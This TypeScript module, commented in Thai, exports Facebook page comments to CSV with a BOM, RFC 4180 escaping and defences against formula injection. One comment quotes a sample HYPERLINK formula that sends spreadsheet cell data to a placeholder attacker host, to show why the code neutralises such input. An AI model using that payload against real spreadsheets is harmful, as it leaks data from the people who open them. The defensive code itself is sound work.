/**
 * ส่งออกเป็น CSV
 *
 * ─── สามเรื่องที่พลาดกันบ่อยและทำให้ไฟล์ใช้ไม่ได้หรืออันตราย ───
 *
 * **1. Excel อ่านภาษาไทยเป็นขยะถ้าไม่มี BOM**
 *
 * Excel บน Windows เดา encoding จากไบต์แรกของไฟล์ ถ้าไม่มี BOM มันจะเดาเป็น
 * โค้ดเพจของระบบ (ไทยคือ windows-874) แล้วภาษาไทยที่เป็น UTF-8 จะกลายเป็น
 * "à¸ªà¸´à¸™à¸„à¹‰à¸²" ทั้งไฟล์ — คนเปิดจะคิดว่าโปรแกรมเราพัง
 *
 * ใส่ `﻿` นำหน้าแก้ได้ทั้งหมด และไม่กระทบโปรแกรมอื่น (Google Sheets,
 * LibreOffice, pandas อ่านออกเหมือนเดิม)
 *
 * **2. คอมเมนต์มีทั้งจุลภาค ขึ้นบรรทัดใหม่ และเครื่องหมายคำพูด**
 *
 * ทั้งสามอย่างอยู่ในคอมเมนต์จริงเป็นปกติ ถ้าไม่ escape ไฟล์จะเพี้ยนทั้งตาราง
 * แบบที่ดูไม่ออกว่าเริ่มเพี้ยนตรงไหน — ครอบด้วย `"` แล้วแปลง `"` เป็น `""`
 * ตามมาตรฐาน RFC 4180
 *
 * **3. Excel รันสูตรจากข้อความที่คนแปลกหน้าพิมพ์เข้ามา**
 *
 * ข้อนี้ร้ายที่สุดและมองไม่เห็นเลยจากตัวไฟล์ — ดู `escapeFormula()`
 */

/** ไบต์นำหน้าที่บอก Excel ว่าไฟล์นี้เป็น UTF-8 */
export const UTF8_BOM = "﻿";

/**
 * อักขระที่ Excel / Google Sheets / LibreOffice ถือว่า "ช่องนี้คือสูตร"
 *
 * แท็บกับ CR อยู่ในลิสต์ด้วยเพราะบางเวอร์ชันตัดมันทิ้งก่อนแล้วค่อยดูตัวถัดไป
 * — `"\t=1+1"` จึงกลายเป็นสูตรได้ทั้งที่ตัวแรกไม่ใช่ `=`
 */
const FORMULA_STARTERS = new Set(["=", "+", "-", "@", "\t", "\r"]);

/**
 * กัน Excel รันสูตรจากคอมเมนต์ของคนแปลกหน้า
 *
 * ─── ทำไมต้องมีข้อนี้ ───
 *
 * คอมเมนต์ในเพจ Facebook **ใครก็พิมพ์ได้** ถ้ามีคนพิมพ์
 *
 *     =HYPERLINK("http://evil.example?d="&A1,"คลิกรับส่วนลด")
 *
 * แล้วเราเขียนลงไฟล์ตรงๆ พอคนดูแลเพจเปิดไฟล์ใน Excel มันจะกลายเป็นลิงก์ที่
 * แนบข้อมูลจากช่องอื่นในไฟล์ส่งออกไปข้างนอก — คนเปิดเห็นแค่ข้อความชวนคลิก
 * ไม่มีทางรู้เลยว่ามันมาจากคอมเมนต์
 *
 * ครอบด้วย `"` **ไม่ช่วย** — RFC 4180 บอกว่านั่นคือข้อความ แต่ Excel
 * ยังคำนวณให้อยู่ดี ต้องเติม `'` นำหน้าเท่านั้น
 *
 * ─── ราคาที่ต้องจ่าย ───
 *
 * Excel กับ Google Sheets ซ่อน `'` ตัวนี้ไว้ (มันคือเครื่องหมาย "อันนี้เป็น
 * ข้อความนะ") แต่ถ้าเปิดด้วย pandas หรือ Notepad จะเห็นติดมาหนึ่งตัว
 *
 * ยอมแลก เพราะคอมเมนต์ที่ขึ้นต้นด้วยอักขระพวกนี้จริงๆ มีอยู่แค่กลุ่มเล็ก
 * (`+66812345678` · `-50%` · `@ร้านนี้`) และเสียแค่ความสวย ส่วนอีกทาง
 * คือเปิดช่องให้คนแปลกหน้าสั่งงานเครื่องคนดูแลเพจ
 *
 * ─── ทำไมเช็คแค่ string ───
 *
 * ตัวเลขที่ส่งเข้ามาเป็น `number` คือค่าที่**เราคำนวณเอง** ไม่ใช่ข้อความของ
 * คนอื่น ปล่อยผ่านได้ และทำให้ค่าติดลบยังเป็นตัวเลขใน Excel ไม่กลายเป็นข้อความ
 */
function escapeFormula(value: string | number): string {
  if (typeof value === "number") return String(value);
  const first = value.charAt(0);
  return FORMULA_STARTERS.has(first) ? `'${value}` : value;
}

/**
 * แปลงค่าหนึ่งช่องให้ปลอดภัยสำหรับ CSV
 *
 * ครอบด้วยเครื่องหมายคำพูด**เสมอ** ไม่ใช่เฉพาะตอนจำเป็น — ไฟล์ใหญ่ขึ้นนิดเดียว
 * แต่ไม่ต้องมานั่งเดาว่าเคสไหนต้องครอบ และไม่มีทางพลาดเคสที่นึกไม่ถึง
 */
export function csvCell(value: string | number | null | undefined): string {
  if (value === null || value === undefined) return '""';
  const text = escapeFormula(value);
  return `"${text.split('"').join('""')}"`;
}

/**
 * สร้างไฟล์ CSV จากหัวตารางและแถวข้อมูล
 *
 * ใช้ CRLF ตาม RFC 4180 — Excel รุ่นเก่าบน Windows ยังต้องการอยู่
 */
export function toCsv(args: {
  headers: readonly string[];
  rows: ReadonlyArray<ReadonlyArray<string | number | null | undefined>>;
  /** ใส่ BOM ไหม — ปิดได้ตอนเขียนเทสต์ที่อยากเทียบข้อความตรงๆ */
  bom?: boolean;
}): string {
  const lines = [
    args.headers.map(csvCell).join(","),
    ...args.rows.map((r) => r.map(csvCell).join(",")),
  ];
  const body = lines.join("\r\n");
  return (args.bom ?? true) ? UTF8_BOM + body : body;
}

export interface ExportableComment {
  createdAtMs: number;
  pageName: string;
  authorName: string | null;
  message: string | null;
  postPermalink: string | null;
}

/**
 * ตั้งชื่อไฟล์ที่เรียงตัวได้ในโฟลเดอร์
 *
 * ขึ้นต้นด้วยวันที่รูป YYYY-MM-DD เพื่อให้เรียงตามชื่อแล้วได้เรียงตามเวลาไปด้วย
 * — คนดาวน์โหลดหลายรอบจะได้ไม่ต้องเปิดดูทีละไฟล์ว่าอันไหนใหม่
 */
export function exportFileName(args: {
  prefix: string;
  atMs: number;
  keyword?: string | undefined;
}): string {
  const date = new Date(args.atMs).toISOString().slice(0, 10);
  const keyword = args.keyword?.trim() ?? "";
  /**
   * ตัดอักขระที่ตั้งชื่อไฟล์ไม่ได้บน Windows (`\ / : * ? " < > |`) ออก
   * แต่**เก็บภาษาไทยไว้** — ชื่อไฟล์เป็นไทยใช้ได้ปกติทุกระบบสมัยนี้
   * และคนหาไฟล์เจอง่ายกว่าชื่อที่ถูกถอดเป็นอักษรโรมัน
   */
  const safe = keyword.replace(/[\\/:*?"<>|]/g, "").replace(/\s+/g, "-").slice(0, 40);
  return safe === ""
    ? `${args.prefix}-${date}.csv`
    : `${args.prefix}-${safe}-${date}.csv`;
}

/**
 * ตัวจัดรูปเวลาที่สร้าง**ครั้งเดียวต่อไฟล์** ไม่ใช่ครั้งเดียวต่อแถว
 *
 * `new Intl.DateTimeFormat()` แพงกว่าที่คิดมาก — audit จับได้ว่าตอนสร้าง
 * ตัวใหม่ทุกแถว ไฟล์ 50,000 แถว (เพดานของหน้าดาวน์โหลด) ใช้เวลา **4 วินาที**
 * ซึ่งเป็น 4 วินาทีที่ค้างอยู่ใน request handler ของ Next.js
 * ย้ายออกมาสร้างครั้งเดียวแล้วเหลือหลักร้อยมิลลิวินาที
 */
function makeTimeFormatter(timeZone: string): Intl.DateTimeFormat {
  return new Intl.DateTimeFormat("sv-SE", {
    timeZone,
    year: "numeric",
    month: "2-digit",
    day: "2-digit",
    hour: "2-digit",
    minute: "2-digit",
    hour12: false,
  });
}

/** แปลงเวลาเป็นข้อความที่อ่านออกใน Excel ตาม timezone ของตัวจัดรูปที่ส่งมา */
function timeCell(atMs: number, fmt: Intl.DateTimeFormat): string {
  const parts = fmt.formatToParts(new Date(atMs));
  const get = (t: string): string => parts.find((p) => p.type === t)?.value ?? "00";
  return `${get("year")}-${get("month")}-${get("day")} ${get("hour")}:${get("minute")}`;
}

/** CSV ของคอมเมนต์ — คอลัมน์เรียงตามลำดับที่คนอ่านต้องการเห็น */
export function commentsToCsv(args: {
  comments: readonly ExportableComment[];
  timeZone: string;
}): string {
  const fmt = makeTimeFormatter(args.timeZone);
  return toCsv({
    headers: ["เวลา", "เพจ", "คนคอมเมนต์", "ข้อความ", "ลิงก์โพสต์"],
    rows: args.comments.map((c) => [
      timeCell(c.createdAtMs, fmt),
      c.pageName,
      c.authorName ?? "",
      c.message ?? "",
      c.postPermalink ?? "",
    ]),
  });
}
